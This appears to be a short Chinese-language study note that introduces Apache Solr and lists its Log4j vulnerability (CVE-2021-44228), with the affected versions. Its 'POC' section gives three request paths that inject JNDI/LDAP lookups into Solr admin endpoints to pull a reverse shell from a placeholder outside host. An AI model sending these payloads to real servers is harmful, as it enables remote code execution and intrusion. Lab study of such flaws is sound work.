## 简介

**Solr**（读作“solar”）是[Apache Lucene](https://zh.wikipedia.org/wiki/Lucene)项目的[开源](https://zh.wikipedia.org/wiki/开源)[企业搜索](https://zh.wikipedia.org/w/index.php?title=企业搜索&action=edit&redlink=1)平台。其主要功能包括[全文检索](https://zh.wikipedia.org/wiki/全文檢索)、命中标示[[2\]](https://zh.wikipedia.org/wiki/Solr#cite_note-2)、[分面搜索](https://zh.wikipedia.org/w/index.php?title=分面搜索&action=edit&redlink=1)、动态聚类、数据库集成，以及富文本（如[Word](https://zh.wikipedia.org/wiki/Word)、[PDF](https://zh.wikipedia.org/wiki/PDF)）的处理。Solr是高度可扩展的，并提供了分布式搜索和索引复制。Solr是最流行的企业级搜索引擎，[[3\]](https://zh.wikipedia.org/wiki/Solr#cite_note-3)Solr 4还增加了[NoSQL](https://zh.wikipedia.org/wiki/NoSQL)支持。

## 一些漏洞

[solr](F:\vulhub\solr)

### log4j

https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228

使用版本：7.4.0 to 7.7.3, 8.0.0 to 8.11.0

POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
/solr/admin/info?d=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}
/solr/admin/cores?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}
```

